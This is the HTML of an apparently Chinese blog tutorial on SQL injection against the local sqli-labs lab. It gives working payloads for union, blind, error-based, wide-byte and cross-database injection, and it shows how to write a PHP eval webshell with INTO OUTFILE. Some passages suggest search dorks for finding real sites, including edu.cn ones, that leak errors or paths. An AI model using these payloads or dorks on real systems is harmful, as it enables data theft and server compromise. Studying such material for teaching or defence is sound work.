-<li><strong>COLUMNS</strong>表存储该用户创建的所有数据库的<strong>库名、表名</strong>和<strong>字段名</strong>，该表中记录数据库<strong>库名、表名和字段名</strong>的字段为，<strong>TABLE_SCHEMA(table_schema)、TABLE_NAME(table_name)、COLUMN_NAME(column_name)</strong></li>
-</ul>
-<h4 id="需要记住的几个函数"><a href="#需要记住的几个函数" class="headerlink" title="需要记住的几个函数"></a>需要记住的几个函数</h4><ul>
-<li><h5 id="database-查看当前数据库"><a href="#database-查看当前数据库" class="headerlink" title="database()查看当前数据库"></a>database()查看当前数据库</h5></li>
-<li><h5 id="version-查看当前版本"><a href="#version-查看当前版本" class="headerlink" title="version()查看当前版本"></a>version()查看当前版本</h5></li>
-<li><h5 id="user-查看当前用户"><a href="#user-查看当前用户" class="headerlink" title="user()查看当前用户"></a>user()查看当前用户</h5></li>
-</ul>
-<h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><p>MySQL中常见注释符的表达方式：#–空格或/* */</p>
-<h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><h5 id="Union注入也叫联合注入"><a href="#Union注入也叫联合注入" class="headerlink" title="Union注入也叫联合注入"></a>Union注入也叫联合注入</h5><p><a href="http://127.0.0.1/Less-1/?id=1测试地址" target="_blank" rel="noopener">http://127.0.0.1/Less-1/?id=1测试地址</a></p>
-<h5 id="测试当前页面出错信息"><a href="#测试当前页面出错信息" class="headerlink" title="测试当前页面出错信息"></a>测试当前页面出错信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当1&#x3D;1的时候为真返回正确页面</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;1</span><br><span class="line"></span><br><span class="line">但1&#x3D;2时返回还是正确页面，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1 and 1&#x3D;2&#39;</span><br><span class="line"></span><br><span class="line">所以可以尝试在id&#x3D;1后面加上单引号&#39; ，id&#x3D;1&#39;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39;</span><br><span class="line">这里报错了，说明存在注入点</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897216762.png" alt="1583897216762"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用order by 查询字段数，因为使用单引号了&#39; 所以要用注释符注释一下，我们这里可以用# 也可以用--+</span><br><span class="line">其中%23代表#井号</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4%23</span><br><span class="line"></span><br><span class="line">我们发现出错了，说没有4这个列</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897341992.png" alt="1583897341992"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这里我们尝试一下3看看有没有这个列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3%23</span><br><span class="line"></span><br><span class="line">页面返回正常，说明字段数是3</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897462676.png" alt="1583897462676"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们这里使用联合查询，查看一下当前版本和库名</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,3%23</span><br><span class="line"></span><br><span class="line">这里返回了2和3</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897552384.png" alt="1583897552384"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们可以在2和3的字段上查询一下库名和版本号</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,version(),database()%23</span><br><span class="line"></span><br><span class="line">版本号是5.5.53，当前库名是security</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897631314.png" alt="1583897631314"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们知道了版本号和当前库名之后就要进行查询当前库中的表，因为当前版本是5.0以上所以数据库中有information_schema这个库，我们来查询一下</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br><span class="line"></span><br><span class="line">这里我们查看了当前security下的表</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583897798516.png" alt="1583897798516"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在大部分情况下用户的用用户名和密码都在users表中，我们来查看一下users表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br><span class="line"></span><br><span class="line">发现有id，username，password，这些正是我们想要的</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905097676.png" alt="1583905097676"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看id，username，password字段的数据</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(id,username,password) from users--+</span><br><span class="line"></span><br><span class="line">这样我们想要的数据就查询出来了</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905244735.png" alt="1583905244735"></p>
-<h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><h5 id="布尔注入，也叫盲注，"><a href="#布尔注入，也叫盲注，" class="headerlink" title="布尔注入，也叫盲注，"></a>布尔注入，也叫盲注，</h5><h5 id="这是我们的初始页面"><a href="#这是我们的初始页面" class="headerlink" title="这是我们的初始页面"></a>这是我们的初始页面</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905377875.png" alt="1583905377875"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先测试页面报错信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39;</span><br><span class="line">这里使用单引号出错了，加上注释符返回成功页面如下。</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905447719.png" alt="1583905447719"></p>
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905503272.png" alt="1583905503272"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">因为页面不能返回数据库的信息，所以我们要使用布尔盲注来进行注入</span><br><span class="line">首先要查询当前数据库的长度，在布尔注入中要用and来连接</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;9--+</span><br><span class="line">我们这里输入9发现错误，并没有返回You are in，我们输入8试一下。</span><br><span class="line">我们输入8之后页面返回乐乐You are in 说明当前数据库长度为8</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905634367.png" alt="1583905634367"></p>
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583905687105.png" alt="1583905687105"></p>
-<p>知道数据库的长度了我们就要注入出数据库的名称，因为盲注不适用工具的情况下只能手动一个一个尝试，效率太慢，我们用Burp Suite进行抓包，自动筛选。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断库名，我们这里用ascii码来跑，ascii码有上下限，从0-127，等号后面要跟数字，不能跟字母，当然也可以不用ascii吗，substr然后等号后面跟字符串</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; and ascii(substr(database(),1,1))&#x3D;101--+</span><br><span class="line"></span><br><span class="line">我们这两将GET请求发送到 intruder模块下</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906874787.png" alt="1583906874787"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现将1的位置clear$掉，然后选中101进行Add$</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906926421.png" alt="1583906926421"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">现在intruder下的payloads在payload type选择Numbers</span><br><span class="line">起始值从0开始结束值到127每次运行间隔1，点击右上角的Start attack，去百度搜索一张ASCII码表，等一下对照</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583906434633.png" alt="1583906434633"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们发现115是s，使用相同手法只需要每次更改database()后面的1的值就行</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907052698.png" alt="1583907043000"></p>
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907307105.png" alt="1583907052698"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里我们已经知道他的库名是security，我们要查询表名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+</span><br><span class="line">然后继续抓包进行自动扫描</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583908711931.png" alt="1583907307105"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里ascii是101我们对照上面的ascii码发现是e按照之前相同步骤我们这里查询出了emails、referers、uagents、users四个表</span><br><span class="line">说明：查看第一个表名更改，1,1的值，想要查询下一个表名更改limit的值，limit是从0开始，1,1是从1开始</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583907737457.png" alt="1583907737457"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询出了表我们查询字段，查看users的字段</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583908847437.png" alt="1583908711931"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">我们看到结果是105对应ascii码是i，使用相同步骤继续查询，最后得出</span><br><span class="line">id，username，password字段</span><br><span class="line"></span><br><span class="line">查询字段数据和union一样将from后的删掉加上该加的然后查询表数据</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select (id) from users limit 0,1),1,1))&#x3D;49--+</span><br><span class="line"></span><br><span class="line">还有个时间注入效率非常慢，能不用时间注入就不用,</span><br><span class="line">这里演示的是查询他的库名，表名和字段名跟union一样</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&#x3D;115,sleep(3),1)--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583917097717.png" alt="1583908847437"></p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>什么时候需要报错注入</p>
-<p>在实际场景中，如果没有一个合适的数据返回点，而是仅仅带入sql数据库查询，就需要报错注入</p>
-<p>SELECT * FROM users WHERE id=’$id’ LIMIT 0,1 正常进行绕过，但是在Less-5没有数据回显，断定为报错注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1、updatexml</span><br><span class="line">0x7e编码是~的解码形式，可以理解为，让后台xml故意报错</span><br><span class="line">concat就是排序</span><br><span class="line">这是查看当前数据库</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><br><span class="line">进一步获取表名，列名，数据。。。</span><br><span class="line">在报错注入的情况下不能使用union select，只能使用select来查询语句</span><br><span class="line"> </span><br><span class="line">之前用union获取表名</span><br><span class="line">union select 1,group_concat(table_name),3 from information_schema.tables where table_schem&#x3D;&#39;security&#39;</span><br><span class="line"></span><br><span class="line">报错注入</span><br><span class="line">and undatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;seurity&#39; limit 0,1),0x7e),1)</span><br><span class="line">因为使用了limit如果数据库内容少的话可以手动一个一个加，但是如果数据库有几百条的话，就不能手动加了，效率太慢，可以使用burp，抓包发送的intruder模块然后$clear清除，将limit第一个值$add一下，选择Payload模块里面的Number设置值，进行攻击</span><br><span class="line"></span><br><span class="line">2、extractvalue</span><br><span class="line">对数据库让他进行一个xml文档的故意报错</span><br><span class="line">利用这种方式面对后台进行一个排序，指定第一个参数为null，让他故意报错，将第二个参数的语句带入数据库执行</span><br><span class="line">and extractvalue(null,concat(0x7e,(select database()),0x7e))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584148581365.png" alt="1583917097717"></p>
-<h3 id="加解密注入"><a href="#加解密注入" class="headerlink" title="加解密注入"></a>加解密注入</h3><p>很多情况下，网站管理员会对传进的参数进行一个加密的操作，加密很可能自己写，也有可能base64，md5等，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在百度搜索以下代码之后会出现一些网址，随便进一个就行</span><br><span class="line">inurl:Mw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">划横线的地方就是典型的base64编码，我们将这一小段代码复制，然后用转换公爵转换一下</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584149885333.png" alt="1584148581365"></p>
-<h4 id="发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果"><a href="#发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果" class="headerlink" title="发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果"></a>发现将这段代码转后之后变成了1230243，这就是base64解密之后的结果</h4><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584148714349.png" alt="1584148714349"></p>
-<h5 id="这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他-id的位置加上base64-decoder-然后将GET请求放到这个函数中，保存"><a href="#这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他-id的位置加上base64-decoder-然后将GET请求放到这个函数中，保存" class="headerlink" title="这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他$id的位置加上base64_decoder()然后将GET请求放到这个函数中，保存"></a>这里我们将sqli-labs的第一关稍微改造一下，将其改造成base64的注入，我们在他$id的位置加上base64_decoder()然后将GET请求放到这个函数中，保存</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584149801524.png" alt="1584149801524"></p>
-<h5 id="打开sqli-labs还是传入-id-1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码"><a href="#打开sqli-labs还是传入-id-1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码" class="headerlink" title="打开sqli-labs还是传入?id=1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码"></a>打开sqli-labs还是传入?id=1，我们发现页面跟之前的sqli-显示不一样了，因为我们改为了base64编码，所以如果想要显示将1转换成base64编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584150737096.png" alt="1584149885333"></p>
-<h5 id="这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出"><a href="#这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出" class="headerlink" title="这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出"></a>这里我们将1转成base64编码后成功显示了这就是加解密最简单的演示，想要查看其它内容步骤相同，都在加解密中将内容加密然后输出</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583983173037.png" alt="1584150737096"></p>
-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>在很多情况下，’为了安全经常会替换成/‘符号进入后台</p>
-<p>当输入id=1’加上单引号的时候会爆出一个反斜杠的错误，这样，我们传入的单引号被转义了，无法逃逸单引号的包围，一般情况下是不存在SQL注入漏洞的，不过有一个特例就是当数据库的编码为GBK编码时，可以使用宽字节注入。</p>
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583918413567.png" alt="1583917392652"></p>
-<p>%df是β的URL编码</p>
-<p>宽字节的格式是在地址后面加一个<strong>%df</strong>再加<strong>单引号</strong>，因为反斜杠的编码是<strong>%5c</strong>而在GBK中%df%5c是繁体字連，所以这个时候单引号成功逃逸，报出mysql 的错误</p>
-<p>之后的查询跟union一样</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里查看的是表名，</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-32&#x2F;?id&#x3D;1%df&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583982481280.png" alt="1583918413567"></p>
-<h3 id="跨库注入"><a href="#跨库注入" class="headerlink" title="跨库注入"></a>跨库注入</h3><p>如果要应用跨库注入，有<strong>一个条件</strong>，那就是当前数据库用户为<strong>root用户</strong>，才可以<strong>对整个数据库进行操作</strong></p>
-<h5 id="确定用户：user-确定用户-如果回显root-localhost或者root-127-0-0-1只要-前面是root那就是root用户"><a href="#确定用户：user-确定用户-如果回显root-localhost或者root-127-0-0-1只要-前面是root那就是root用户" class="headerlink" title="确定用户：user()    确定用户    如果回显root@localhost或者root@127.0.0.1只要@前面是root那就是root用户"></a>确定用户：user()    确定用户    如果回显root@localhost或者<a href="mailto:root@127.0.0.1">root@127.0.0.1</a>只要@前面是root那就是root用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">跟union查询一样，先获取字段，然后再返回数字位置查看当前用户</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,user()--+ </span><br><span class="line">因为@前是root，所以我们可以进行一个跨库注入</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583983833758.png" alt="1583982481280"></p>
-<h4 id="获取数据库过程："><a href="#获取数据库过程：" class="headerlink" title="获取数据库过程："></a>获取数据库过程：</h4><h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><h5 id="获取当前所有数据库"><a href="#获取当前所有数据库" class="headerlink" title="获取当前所有数据库"></a>获取当前所有数据库</h5><h5 id="存有所有数据库的表名为：-information-schema-schemata-存储所有数据库"><a href="#存有所有数据库的表名为：-information-schema-schemata-存储所有数据库" class="headerlink" title="存有所有数据库的表名为：    information_schema.schemata    存储所有数据库"></a>存有所有数据库的表名为：    information_schema.schemata    存储所有数据库</h5><h5 id="schema-name-获取数据库名"><a href="#schema-name-获取数据库名" class="headerlink" title="schema_name        获取数据库名"></a>schema_name        获取数据库名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583985321796.png" alt="1583983173037"></p>
-<h5 id="这里我们获取myemployees库里的表"><a href="#这里我们获取myemployees库里的表" class="headerlink" title="这里我们获取myemployees库里的表"></a>这里我们获取myemployees库里的表</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;myemployees&#39;--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583998370760.png" alt="1583983833758"></p>
-<h5 id="获取当前字段"><a href="#获取当前字段" class="headerlink" title="获取当前字段"></a>获取当前字段</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;employees&#39; and table_schema&#x3D;&#39;myemployees&#39;--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1583985119530.png" alt="1583985119530"></p>
-<h5 id="获取department表的数据"><a href="#获取department表的数据" class="headerlink" title="获取department表的数据"></a>获取department表的数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-1&#x2F;?id&#x3D;1&#39; and 1&#x3D;2 union select 1,2,group_concat(location_id) from myemployees.departments--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062638658.png" alt="1583985321796"></p>
-<p>跨库注入和普通注入的区别</p>
-<p>跨库注入首先要获取所有数据库名称</p>
-<p>在查询表名，字段名，必须限定你的要注入的数据库名称</p>
-<h4 id="mysql高权限用户注入"><a href="#mysql高权限用户注入" class="headerlink" title="mysql高权限用户注入"></a>mysql高权限用户注入</h4><p>getshell</p>
-<h5 id="mysql注入高权限文件操作"><a href="#mysql注入高权限文件操作" class="headerlink" title="mysql注入高权限文件操作"></a>mysql注入高权限文件操作</h5><h5 id="目的：发现了注入点，还想进一步渗透，写入文件来getshell"><a href="#目的：发现了注入点，还想进一步渗透，写入文件来getshell" class="headerlink" title="目的：发现了注入点，还想进一步渗透，写入文件来getshell"></a>目的：发现了注入点，还想进一步渗透，写入文件来getshell</h5><p>写入PHP EVAL 一句话木马</p>
-<?php eval($_POST["pass"])?>
-
-<p>写入php一句木马有一个前提：我们的木马必须被mysql允许上传，设置secure_file_priv=为空</p>
-<p>secure_file_priv 是可以绕过的(通过mysql的日态文件来进行绕过，有一个前提，网站必须开启这个日态功能，如果没有开启，就不许有一个执行sql语句的地方)</p>
-<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><h5 id="sql-labs第七关-文件写入"><a href="#sql-labs第七关-文件写入" class="headerlink" title="sql labs第七关 文件写入"></a>sql labs第七关 文件写入</h5><h5 id="sql语句绕过分析"><a href="#sql语句绕过分析" class="headerlink" title="sql语句绕过分析"></a>sql语句绕过分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将引号里的id删除</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;( (&#39; $id &#39; ) )</span><br><span class="line"></span><br><span class="line">加上 &#39;))--+</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;( (&#39; &#39;))--+ &#39; ) )</span><br></pre></td></tr></table></figure>
-
-<h5 id="在sqli-labs里面尝试写入"><a href="#在sqli-labs里面尝试写入" class="headerlink" title="在sqli labs里面尝试写入"></a>在sqli labs里面尝试写入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;&#39;))union 1,2,3--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1584062306167.png" alt="1583998370760"></p>
-<p>这里并没有响应，文件写入注入点，一定没有反应</p>
-<p>文件写入语句:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,3</span><br></pre></td></tr></table></figure>
-
-<p>在这个<strong>2</strong>中使用<strong>单引号</strong>写入你想写入的东西</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里我们直接使用一句话木马进行上传,这里最后是路径，路径必须存才否则报错，这里必须用双斜杠，因为单斜杠会被转义</span><br><span class="line">union select 1,&#39;&lt;?php eval($_POST[&quot;pass&quot;])?&gt;&#39;,3 into outfile &#39;D:\\1\\1.php&#39;</span><br></pre></td></tr></table></figure>
-
-<h5 id="在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。"><a href="#在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。" class="headerlink" title="在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。"></a>在这种情况下，我们知道对方网站的路径，但是，在实际渗透中，我们并不知道这个值，怎么办。</h5><h5 id="1、通过错误爆出路径"><a href="#1、通过错误爆出路径" class="headerlink" title="1、通过错误爆出路径"></a>1、通过错误爆出路径</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这两个命令可以再百度查看一些错误网页信息</span><br><span class="line">inurl:php warning</span><br><span class="line">inurl:edu.cn warning</span><br></pre></td></tr></table></figure>
-
-<p>网站                                                                        错误信息</p>
